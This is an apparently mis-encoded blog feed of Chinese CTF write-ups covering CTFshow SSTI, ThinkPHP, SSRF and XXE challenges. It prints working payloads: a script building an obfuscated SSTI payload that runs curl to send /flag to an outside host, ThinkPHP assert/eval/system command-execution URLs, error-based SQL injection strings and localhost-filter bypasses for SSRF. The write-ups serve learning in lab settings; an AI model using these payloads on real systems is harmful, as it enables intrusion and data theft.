class="line"></span><br><span class="line"><span class="comment">#è·å–æ‹¼æ¥çš„å­—ç¬¦</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">go</span>):</span><br><span class="line">    temp = <span class="built_in">list</span>(go)</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(temp):</span><br><span class="line">        <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(temp)-<span class="number">1</span>:</span><br><span class="line">            res+=change(val)+<span class="string">&quot;~&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res+=change(val)</span><br><span class="line">    <span class="keyword">return</span> res    </span><br><span class="line">            </span><br><span class="line">payload = <span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;curl http://xxxx:23333?`cat /flag`&quot;)&#x27;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">ppp = devide(payload)</span><br><span class="line"><span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(ppp):</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(ppp)-<span class="number">1</span>:</span><br><span class="line">        res += <span class="string">&quot;chr((&quot;</span>+merge(val)+<span class="string">&quot;)|int)~&quot;</span><span class="comment">#åŠ intçš„åŸå› æ˜¯chr()åªèƒ½ä¼ å…¥æ•°å­—,å°±æ˜¯è¯´ä¸æ¥å—chr(&#x27;1&#x27;)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += <span class="string">&quot;chr((&quot;</span>+merge(val)+<span class="string">&quot;)|int)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<p>å°å¼¹ä¸€ä¸‹,æˆåŠŸï¼</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240412172735048.png"  alt="image-20240412172735048"></p>
<h1 id="web-372"><a href="#web-372" class="headerlink" title="web 372"></a>web 372</h1><p>æŠŠcountç¦äº†ï¼Œåªéœ€æŠŠä¸Šé¢˜çš„countæ¢ä½lengthå³å¯</p>
]]></content>
      <categories>
        <category>å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>å…¥é—¨</tag>
        <tag>å­¦ä¹ </tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP-CTFSHOW</title>
    <url>/2024/04/13/ThinkPHP-ctfshow/</url>
    <content><![CDATA[<h1 id="æŒ–æ´å¿…ç»ä¹‹è·¯"><a href="#æŒ–æ´å¿…ç»ä¹‹è·¯" class="headerlink" title="æŒ–æ´å¿…ç»ä¹‹è·¯"></a>æŒ–æ´å¿…ç»ä¹‹è·¯</h1><span id="more"></span>

<p>å­¦</p>
<p><a class="link"   href="https://static.kancloud.cn/manual/thinkphp/1678" >åºè¨€ Â· ThinkPHP3.2.3å®Œå…¨å¼€å‘æ‰‹å†Œ Â· çœ‹äº‘ (kancloud.cn)<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="web569"><a href="#web569" class="headerlink" title="web569"></a>web569</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240414110912329.png"  alt="image-20240414110912329"></p>
<p>å¦‚é¢˜æ‰€è¯´ï¼Œäº†è§£pathinfoå³å¯æ‹¿åˆ°flag</p>
<p>payload:<code>index.php/admin/login/ctfshowlogin</code></p>
<h1 id="web570"><a href="#web570" class="headerlink" title="web570"></a>web570</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240414111946911.png"  alt="image-20240414111946911"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240414112855650.png"  alt="image-20240414112855650"></p>
<p>åœ¨ç»™å‡ºçš„é™„ä»¶çš„Commom&#x2F;Conf.phpä¸­æ‰¾åˆ°äº†è¿™ä¸ªé—­åŒ…è·¯ç”±ï¼Œæœ‰ä¸ªå¯ä»¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call_user_func()å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¿™ä¸ªå‘½ä»¤çš„å‚æ•°</span><br></pre></td></tr></table></figure>

<p>æ¯”å¦‚æˆ‘ä»¬æƒ³æ‰§è¡Œphpinfo()é‚£ä¹ˆæˆ‘ä»¬çš„payloadå°±æ˜¯<code>/ctfshow/phpinfo/1</code></p>
<p>ç”±äºåœ¨urlä¸­ä½¿ç”¨&#x2F;ä¼šè¢«è·¯ç”±æ›¿æ¢ï¼Œæ‰€ä»¥è¦æŠŠå‘½ä»¤é€ƒå‡ºæ¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1:/index.php/ctfshow/assert/assert($_GET[1])?1=system(&#x27;cat /f*&#x27;);</span><br><span class="line">payload2:/index.php/ctfshow/assert/eval($_GET[1])?1=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>

<p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆç”¨ä¸¤ä¸ªevalå°±æ‰“ä¸é€šï¼Œä¼°è®¡ç°åœ¨æˆ‘è¿˜ç†è§£ä¸äº†</p>
<h1 id="web571"><a href="#web571" class="headerlink" title="web571"></a>web571</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240415180500901.png"  alt="image-20240415180500901"></p>
<p>æ‰“å¼€æºç å‘ç°æœ‰å¯æ§å‚æ•°n</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240415225802599.png"  alt="image-20240415225802599"></p>
<p>æŒç»­è·Ÿè¿›å‡½æ•°,æœ€ç»ˆè¿½åˆ°è¿™é‡Œ</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240415225923394.png"  alt="image-20240415225923394"></p>
<p>å®é™…ä¸Šæœ¬åœ°è°ƒè¯•çš„æ—¶å€™ä¸æ˜¯åˆ°è¿™é‡Œï¼Œçœ‹åˆ«çš„æ–‡ç« è¯´æ˜¯é¢˜ç›®ç¯å¢ƒå’Œæˆ‘çš„ç¯å¢ƒä¸ä¸€æ ·çš„é—®é¢˜</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:/index.php/Home/index/index?n=&lt;?php system(cat /f*);?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wrong payload:/index.php/Home/index/index/n/&lt;?php system(cat /f*);?&gt;</span><br><span class="line">æŒ‰ç†æ¥è¯´è¿™æ˜¯path_infoçš„æ ‡å‡†æ ¼å¼ï¼Œä½†æ˜¯æˆ‘å‘ç°è¦æ˜¯å‚æ•°æœ‰&lt;åé¢çš„ä¸œè¥¿ä¸€æ¦‚ä¸å‡ºæ¥ï¼Œè°ƒè¯•åŠŸåŠ›ä¸è¶³ï¼Œä¹Ÿçœ‹ä¸å‡º</span><br></pre></td></tr></table></figure>

<h1 id="web372"><a href="#web372" class="headerlink" title="web372"></a>web372</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240417105806980.png"  alt="image-20240417105806980"></p>
<p>çˆ†ç ´+rce</p>
<p>é¦–å…ˆthinkphpçš„debugæ¨¡å¼æ˜¯è‡ªåŠ¨æ‰“å¼€çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯ä¸ªæŠ¥é”™éƒ½ä¼šè®°å½•åˆ°æ—¥å¿—ä¸­å»ï¼Œè¿™æ ·æˆ‘ä»¬åªè¦è¯»å–æ—¥å¿—å³å¯</p>
<p>åº”è¯¥æ˜¯å¼€å‘è€…ç›®å½•ç»“æ„è®¾ç½®ä¸å¥½ï¼Œæ­£å¸¸æ€ä¹ˆä¼šç»™è¿›å…¥&#x2F;Applicationå‘¢</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ—¥å¿—ç›®å½•:/Application/Runtime/Logs/æ¨¡å—å/å¹´ä»½_æœˆä»½_æ—¥æœŸ.log</span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240417110114141.png"  alt="image-20240417110114141"></p>
<p>å¼€æ‰«</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240417153113112-1713339073489-1.png"  alt="image-20240417153113112"></p>
<p>ä¼šæ‰«å‡ºæ¥ä¸€ä¸ªä»Šå¤©çš„å’Œä¸€ä¸ªé»‘å®¢21å¹´ç•™ä¸‹çš„åé—¨</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240417153146759.png"  alt="image-20240417153146759"></p>
<p>é¡ºç€è¿™ä¸ªåé—¨rceå³å¯</p>
<h1 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h1><p><a class="link"   href="https://blog.csdn.net/qq_50589021/article/details/120616736" >thinkPHP3.2.3sqlæ³¨å…¥æ¼æ´_think\controller:parsesqlæ–¹æ³•ä¸å­˜åœ¨!-CSDNåšå®¢<i class="fas fa-external-link-alt"></i></a></p>
<p>ç”±äºæˆ‘ä¸‹çš„ç‰ˆæœ¬æ˜¯3.2.5ï¼Œæœ¬åœ°æ²¡å¤ç°æˆåŠŸï¼Œå°±çœ‹åˆ«äººçš„å§</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//çˆ†è¡¨</span><br><span class="line">index.php?id[where]= 1%20and%20updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) %23</span><br><span class="line">//çˆ†åˆ—å</span><br><span class="line">index.php?id[where]= 1%20and%20updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flags&#x27;),0x7e),1) %23</span><br><span class="line">//çˆ†å­—æ®µå€¼</span><br><span class="line">index.php?id[where]= 1%20and%20updatexml(1,concat(0x7e,substr((select group_concat(flag4s) from flags),16,32),0x7e),1) %23</span><br></pre></td></tr></table></figure>



<h1 id="åˆ°æ­¤ä¸ºæ­¢å…ˆï¼Œæƒ³è¦å®Œæ•´åšå‡ºä¸€é¢˜è¦å®¡çš„ä»£ç å¤ªå¤šï¼ŒåŠŸåŠ›ä¸è¶³ï¼Œæ’¤é€€"><a href="#åˆ°æ­¤ä¸ºæ­¢å…ˆï¼Œæƒ³è¦å®Œæ•´åšå‡ºä¸€é¢˜è¦å®¡çš„ä»£ç å¤ªå¤šï¼ŒåŠŸåŠ›ä¸è¶³ï¼Œæ’¤é€€" class="headerlink" title="åˆ°æ­¤ä¸ºæ­¢å…ˆï¼Œæƒ³è¦å®Œæ•´åšå‡ºä¸€é¢˜è¦å®¡çš„ä»£ç å¤ªå¤šï¼ŒåŠŸåŠ›ä¸è¶³ï¼Œæ’¤é€€"></a>åˆ°æ­¤ä¸ºæ­¢å…ˆï¼Œæƒ³è¦å®Œæ•´åšå‡ºä¸€é¢˜è¦å®¡çš„ä»£ç å¤ªå¤šï¼ŒåŠŸåŠ›ä¸è¶³ï¼Œæ’¤é€€</h1>]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
        <category>å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>å…¥é—¨</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF-CTFSHOW</title>
    <url>/2024/03/22/SSRF-CTFSHOW/</url>
    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>

<p>ssrfæœ¬è´¨æ˜¯æŠŠwebæœåŠ¡å™¨å½“ä½œè·³æ¿ï¼Œè¯·æ±‚ä¸€äº›ä¸è®©ç›´æ¥è¯·æ±‚çš„ä¸œè¥¿</p>
<h1 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322173840844.png"  alt="image-20240322173840844"></p>
<p><code>curl_init()</code>æ‰“å¼€ä¸€ä¸ªcurlä¼šè¯</p>
<p><code>curl_setopt()</code>è®¾ç½®è¾“å‡ºæµä¿¡æ¯:</p>
<p>ç¬¬ä¸€ä¸ªæ˜¯ä¸æŠŠå¤´æ–‡ä»¶ä¿¡æ¯å½“ä½œè¾“å‡ºæµå¸¦å›</p>
<p>ç¬¬äºŒä¸ªæ˜¯æŠŠcurl_execè¯·æ±‚åˆ°çš„ä¿¡æ¯ç»Ÿç»Ÿå‘å›</p>
<p>payload:<code>url=127.0.0.1/flag.php</code></p>
<h1 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322175247131.png"  alt="image-20240322175247131"></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://0.0.0.0/flag.php</span><br><span class="line">url=http://0x7f.0.0.1/flag.php</span><br><span class="line">url=http://0177.0.0.1/flag.php</span><br><span class="line">ç¼ºçœæ¨¡å¼ï¼š127.0.0.1å†™æˆ127.1</span><br><span class="line">CIDRï¼šurl=http://127.127.127.127/flag.php</span><br></pre></td></tr></table></figure>

<p>å‰ä¸¤ä¸ªéƒ½æ˜¯ç”¨0.0.0.0(ä»£è¡¨æœ¬æœºä»»ä½•ip)æ¥ç»•è¿‡çš„</p>
<p>åä¸¤ä¸ªåˆ†åˆ«æ˜¯ç”¨åå…­è¿›åˆ¶å’Œå…«è¿›åˆ¶æ¥ç»•è¿‡çš„</p>
<h1 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322181428742.png"  alt="image-20240322181428742"></p>
<p>åŒä¸Šé¢˜ç›®</p>
<h1 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322193022404.png"  alt="image-20240322193022404"></p>
<p>banæ‰äº†0å’Œ1ï¼Œè¯´æ˜æœ¬åœ°çš„127.0.0.1æ€ä¹ˆéƒ½ç»•ä¸è¿‡å»äº†</p>
<p>æ¢ä¸€ç§æ€è·¯ï¼Œè¾“å…¥ä¸€ä¸ªè§£æåˆ°127.0.0.1çš„åŸŸåå³å¯</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240322193226851.png"  alt="image-20240322193226851"></p>
<p>payload:<code>url=http://ecd.tencent.com/flag.php</code></p>
<h1 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322194654981.png"  alt="image-20240322194654981"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br></pre></td></tr></table></figure>

<h1 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322195149266.png"  alt="image-20240322195149266"></p>
<p><code>url=http://0/flag.php</code></p>
<h1 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240328194834744.png"  alt="image-20240328194834744"></p>
<p>FILETER_FLAG_NO_PRIV_RANGE:è¦æ±‚å€¼ä¸åœ¨ä¿ç•™çš„ipèŒƒå›´å†…</p>
<p>FILETER_FLAG_NO_RES_RANGE:è¦æ±‚å€¼ä¸åœ¨ RFC æŒ‡å®šçš„ç§æœ‰èŒƒå›´ IP å†…</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240328195426762.png"  alt="image-20240328195426762"></p>
<p>æ„æ€æ˜¯ä»¥ä¸Šçš„ipåœ°å€éƒ½ä¸èƒ½ç”¨äº†ï¼Œå°±ä¸èƒ½ç”¨æŒ‡å‘äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨302æŒ‘æˆ˜å³å¯</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240328195527042.png"  alt="image-20240328195527042"></p>
<h1 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240328200847412.png"  alt="image-20240328200847412"></p>
<p>è¦æ±‚urlä»¥<code>http://ctf.</code>ä¸ºå¼€å¤´ï¼Œshowä¸ºç»“å°¾</p>
<p>payload:<code>url=http://ctf.@127.0.0.1/flag.php?show</code></p>
<p>@è¡¨ç¤ºä»¥ctf.ç”¨æˆ·åè®¿é—®ï¼Œ?è¡¨ç¤ºgetä¼ å‚</p>
<h1 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h1>]]></content>
      <categories>
        <category>å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>å…¥é—¨</tag>
        <tag>å­¦ä¹ </tag>
        <tag>CTFSHOW</tag>
      </tags>
  </entry>
  <entry>
    <title>XXEæ¼æ´å­¦ä¹ </title>
    <url>/2024/02/27/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="åŸºäºxmlæ–‡æ¡£ä½¿ç”¨ä¸­äº§ç”Ÿçš„æ¼æ´"><a href="#åŸºäºxmlæ–‡æ¡£ä½¿ç”¨ä¸­äº§ç”Ÿçš„æ¼æ´" class="headerlink" title="åŸºäºxmlæ–‡æ¡£ä½¿ç”¨ä¸­äº§ç”Ÿçš„æ¼æ´"></a>åŸºäºxmlæ–‡æ¡£ä½¿ç”¨ä¸­äº§ç”Ÿçš„æ¼æ´</h1><span id="more"></span>

<h1 id="XMLæ–‡æ¡£ä»‹ç»"><a href="#XMLæ–‡æ¡£ä»‹ç»" class="headerlink" title="XMLæ–‡æ¡£ä»‹ç»"></a>XMLæ–‡æ¡£ä»‹ç»</h1><p>xmlä¸htmlå¾ˆç±»ä¼¼ï¼Œxmlè¢«ç”¨æ¥ä¼ è¾“æ•°æ®ï¼Œhtmlè¢«ç”¨æ¥æ˜¾ç¤ºæ•°æ®</p>
<p>xmlæ–‡æ¡£å¯ä¸ºä¼ è¾“çš„æ•°æ®è¿›è¡Œåˆ†ç±»ï¼Œæ¯”å¦‚ç”¨æˆ·å¡«å…¥çš„æ•°æ®,å§“åï¼Œå¹´é¾„ç­‰ä¼šä»¥æ ‘çŠ¶ç»“æ„å­˜å‚¨çš„xmlæ–‡æ¡£ä¸­</p>
<p>1.å…ƒç´ ï¼Œå¦‚<body></body>,è€ç”Ÿå¸¸æ€ï¼Œå†™æ³•å’Œhtmlå‡ ä¹ä¸€æ ·</p>
<p>2.å±æ€§ï¼Œä¸htmlå‡ ä¹ä¸€æ ·</p>
<p>3.å®ä½“:ç”¨æ¥å®šä¹‰æ™®é€šæ–‡æœ¬çš„å˜é‡ã€‚å®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ã€‚æœ‰ç‚¹æŠ½è±¡ï¼Œå…¶å®æŠŠå®ƒå½“æˆä¸€ä¸ªä»£åè¯å°±å¥½</p>
<p>4.PCDATA:PCDATA æ˜¯ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚è¿™äº›æ–‡æœ¬å°†è¢«è§£æå™¨æ£€æŸ¥å®ä½“ä»¥åŠæ ‡è®°ã€‚å°±æ¯”å¦‚æˆ‘ä»¬çš„è‡ªå·±å®šä¹‰çš„å…ƒç´ ï¼Œå±æ€§ï¼Œè¿™ä¼šè¢«è§£æå™¨å½“ä½œæ˜¯ç‰¹æ®Šçš„</p>
<p>5.CDATA:æ˜¯ä¸ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬,åœ¨xmlä¸­ä¿ç•™äº†ä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦ï¼Œæ¯”å¦‚&amp;,&lt;,å½“ä½ åœ¨æ–‡æœ¬ä¸­ä¸æƒ³ä»–ä»¬è¢«æ ‡è®°ä¸ºç‰¹æ®Šå­—ç¬¦æ—¶ï¼Œå°±ç»™è¿™æ®µæ–‡æœ¬æ ‡ä½œCDATA</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240227165634626.png"  alt="image-20240227165634626"></p>
<h1 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h1><p>å‡è®¾æˆ‘æŠŠç”¨æˆ·çš„æ•°æ®å­˜å‚¨åœ¨äº†xmlæ–‡æ¡£ä¸­ï¼Œæˆ‘æ€ä¹ˆè®©æ•°æ®ä¼ è¾“åˆ°å‰ç«¯å¹¶å±•ç¤ºå‘¢</p>
<h2 id="xmlæ–‡æ¡£"><a href="#xmlæ–‡æ¡£" class="headerlink" title="xmlæ–‡æ¡£"></a>xmlæ–‡æ¡£</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170016299.png"  alt="image-20240227170016299"></p>
<h2 id="å±•ç¤º"><a href="#å±•ç¤º" class="headerlink" title="å±•ç¤º"></a>å±•ç¤º</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170324785.png"  alt="image-20240227170324785"></p>
<h2 id="å®ç°å‡½æ•°"><a href="#å®ç°å‡½æ•°" class="headerlink" title="å®ç°å‡½æ•°"></a>å®ç°å‡½æ•°</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170349022.png"  alt="image-20240227170349022"></p>
<p>è¿™é‡Œç”¨var_dump()çœ‹çœ‹ä»–æ˜¯æ€ä¹ˆå­˜å‚¨çš„ï¼Œå®é™…ä¸Šå°±æ˜¯ä»¥æ¯ä¸ªæ ‡ç­¾å‘½åï¼Œä½œä¸ºmyselfå¯¹è±¡ä¸­çš„ä¸€ä¸ªå±æ€§ï¼Œå¹¶æŠŠæ ‡ç­¾ä¸­çš„æ–‡æœ¬å½“ä½œå±æ€§å€¼ï¼Œå¦‚æœæœ‰å¤šä¸ªæ ‡ç­¾ï¼Œå°±å»ºç«‹ä¸€ä¸ªæ•°ç»„</p>
<p>å¦‚æœæœ‰åµŒå¥—çš„æ ‡ç­¾,å°±å†åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼ŒæŠŠå®ƒåŒ…å«çš„æ ‡ç­¾å†å½“ä½œå±æ€§æ”¾åœ¨é‡Œé¢</p>
<p>1.simplexml_loader_file:è·å–ä¸€ä¸ªxmlæ–‡æ¡£ï¼Œå¹¶æŠŠå®ƒè½¬ä¸ºä¸€ä¸ªå¯¹è±¡</p>
<p>3.file_get_contents:è¯»å–ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶æŠŠæ–‡ä»¶å†…å®¹è½¬ä¸ºå­—ç¬¦ä¸²</p>
<p>2.simplexml_loader_string:è¯»å–ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶æŠŠå®ƒè½¬åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡</p>
<h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><h2 id="å‰ç½®"><a href="#å‰ç½®" class="headerlink" title="å‰ç½®"></a>å‰ç½®</h2><p>ç†è§£æ¼æ´ï¼Œæˆ‘ä»¬éœ€è¦ç†è§£xmlä¸­dtdæ–‡ä»¶å’Œå®ä½“çš„ä½¿ç”¨</p>
<h3 id="dtd"><a href="#dtd" class="headerlink" title="dtd"></a>dtd</h3><p>dtdæ–‡ä»¶å®é™…å°±æ˜¯ç”¨æ¥å­˜å‚¨ä¸Šè¿°<code>&lt;!ELEMENT&gt;</code>ç­‰å£°æ˜çš„æ–‡ä»¶ï¼Œå®ƒå¯ä»¥å†…éƒ¨å£°æ˜ï¼Œä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚ä¸Šè¿°å®ä¾‹ä¸­æˆ‘ä»¬ä½¿ç”¨çš„å°±æ˜¯å†…éƒ¨å£°æ˜ï¼Œç°åœ¨æˆ‘ä»¬æ¥ä»‹ç»å¤–éƒ¨å¼•ç”¨</p>
<p>åˆ›å»ºä¸€ä¸ªt.dtdæ–‡ä»¶</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240227171708419.png"  alt="image-20240227171708419"></p>
<p>å¤–éƒ¨å¼•ç”¨å®ƒï¼Œè¯­æ³•ä¸º<code>&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;t.dtd&quot;&gt;</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240227171849486.png"  alt="image-20240227171849486"></p>
<p>æ­£å¸¸æ˜¾ç¤º</p>
<h2 id="å®ä½“"><a href="#å®ä½“" class="headerlink" title="å®ä½“"></a>å®ä½“</h2><p>è¯­æ³•<code>&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“æ‰€ä»£çš„ä¸œè¥¿&quot;&gt;</code>,å¼•ç”¨çš„ä¸¤ç§æ–¹å¼</p>
<p>1.&amp;å®ä½“å;(è‹¥è¦å¼•ç”¨å¤–éƒ¨çš„å®ä½“è¦åœ¨å®ä½“åç§°å’Œå®ä½“æ‰€ä»£çš„ä¸œè¥¿ä¹‹é—´åŠ ä¸ªSYSTEM);</p>
<p>2.%å®ä½“å;è¿™ä¸ªåªèƒ½åœ¨dtdä¸­ä½¿ç”¨</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240227172352172.png"  alt="image-20240227172352172"></p>
<p>å¯ä»¥çœ‹åˆ°æˆ‘è¿™é‡Œç”¨äº†å«jumpçš„å®ä½“æ¥ä»£åâ€è·³â€ï¼Œè€Œåå°±ä¼šä¸ºjumpåˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼ŒæŠŠâ€è·³â€æ”¾é‡Œé¢ï¼Œæ‰€ä»¥è¯´æ˜¯å®ä½“æŠŠï¼Œå› ä¸ºå®ƒæ˜¯çœŸçœŸå®å®å­˜åœ¨çš„ä¸€ä¸ªå¯¹è±¡</p>
<h3 id="å®ä½“ä»£åæ”¯æŒçš„åè®®"><a href="#å®ä½“ä»£åæ”¯æŒçš„åè®®" class="headerlink" title="å®ä½“ä»£åæ”¯æŒçš„åè®®"></a>å®ä½“ä»£åæ”¯æŒçš„åè®®</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227172609101.png"  alt="image-20240227172609101"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h2 id="NCTF-2019-Fake-XML-cookbook"><a href="#NCTF-2019-Fake-XML-cookbook" class="headerlink" title="[NCTF 2019]Fake XML cookbook"></a>[NCTF 2019]Fake XML cookbook</h2><h3 id="é¢˜é¢"><a href="#é¢˜é¢" class="headerlink" title="é¢˜é¢"></a>é¢˜é¢</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227214415944.png"  alt="image-20240227214415944"></p>
<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227214519453.png"  alt="image-20240227214519453"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240227214625769.png"  alt="image-20240227214625769"></p>
<p>æ¼æ´ç‚¹å·²ç»éå¸¸æ¸…æ™°ï¼Œè¿™é‡Œæˆ‘ä»¬è¾“å…¥çš„ç”¨æˆ·å¯†ç æ˜¯ä»¥xmlæ–‡æ¡£çš„å½¢å¼å‘å›ï¼Œä½†æ˜¯åç«¯ä»£ç æœ‰é”™è¯¯ï¼ŒæŠ¥é”™ä¿¡æ¯æŠŠusernameæ‰€å¸¦çš„å€¼ä¸€èµ·å‘å›æ¥äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦ä¿®æ”¹usernameçš„å€¼å°±å¯ä»¥åšåˆ°æ–‡ä»¶è¯»å–ï¼Œæ„é€ å¦‚ä¸‹</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240227214812065.png"  alt="image-20240227214812065"></p>
<p>è¿™é‡Œä¸çŸ¥é“å®ƒçš„dtdæ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥æˆ‘ä»¬å†åˆ›å»ºä¸€ä¸ªdtdå£°æ˜ä¹Ÿæ²¡äº‹ï¼Œåªè¦ç”¨äº†å…¶ä¸­çš„ä¸€ä¸ªæ ¹å…ƒç´ å³å¯ï¼Œè¿™é‡Œæˆ‘è¯•è¿‡äº†ç”¨xxeæˆ–è€…userä½œæ ¹å…ƒç´ éƒ½æ˜¯å¯ä»¥æ‰“é€šçš„</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240227215140471.png"  alt="image-20240227215140471"></p>
<h2 id="æ— å›æ˜¾xxe"><a href="#æ— å›æ˜¾xxe" class="headerlink" title="æ— å›æ˜¾xxe"></a>æ— å›æ˜¾xxe</h2><p>æœ‰å›æ˜¾çš„æƒ…å†µå¯ä»¥ç›´æ¥åœ¨é¡µé¢ä¸­çœ‹åˆ°Payloadçš„æ‰§è¡Œç»“æœæˆ–ç°è±¡ï¼Œæ— å›æ˜¾çš„æƒ…å†µåˆç§°ä¸ºblind xxeï¼Œå¯ä»¥ä½¿ç”¨å¤–å¸¦æ•°æ®é€šé“æå–æ•°æ®ï¼Œå…ˆä½¿ç”¨php:&#x2F;&#x2F;filterè·å–ç›®æ ‡æ–‡ä»¶çš„å†…å®¹ï¼Œç„¶åå°†å†…å®¹ä»¥httpè¯·æ±‚å‘é€åˆ°æ¥å—æ•°æ®çš„æœåŠ¡å™¨ã€‚</p>
<p>ã€€<strong>xml.php</strong></p>
